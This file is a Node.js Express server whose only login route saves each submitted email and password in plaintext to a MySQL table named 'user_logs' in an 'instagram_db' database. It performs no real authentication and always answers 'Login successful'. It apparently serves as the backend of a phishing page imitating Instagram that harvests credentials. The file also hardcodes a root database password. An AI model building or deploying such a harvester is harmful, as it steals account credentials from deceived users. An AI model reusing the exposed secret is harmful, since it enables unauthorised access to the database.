const express = require('express');
const bodyParser = require('body-parser');
const mysql = require('mysql2/promise'); // Use mysql2/promise for async/await support
const path = require('path');
const cors = require('cors');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(cors());

// Create MySQL pool for connection pooling
const pool = mysql.createPool({
    host: 'viaduct.proxy.rlwy.net',
user: 'root', // replace with your MySQL username
password: 'RaRNOdpYCigBwEbaItdEiFMGOdcFvUay', // replace with your MySQL password
database: 'instagram_db', // use your actual database name here
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Login Route
app.post('/login', async (req, res) => {
    const { email, password } = req.body;

    try {
        // Get a connection from the pool
        const connection = await pool.getConnection();
        
        // Execute the query using the connection
        const [results] = await connection.query('INSERT INTO user_logs (email, password, login_time) VALUES (?, ?, NOW())', [email, password]);
        
        // Release the connection back to the pool
        connection.release();
        
        console.log('User login data logged in database');
        res.send('Login successful');
    } catch (error) {
        console.error('Error logging in user:', error);
        res.status(500).send('Login error');
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
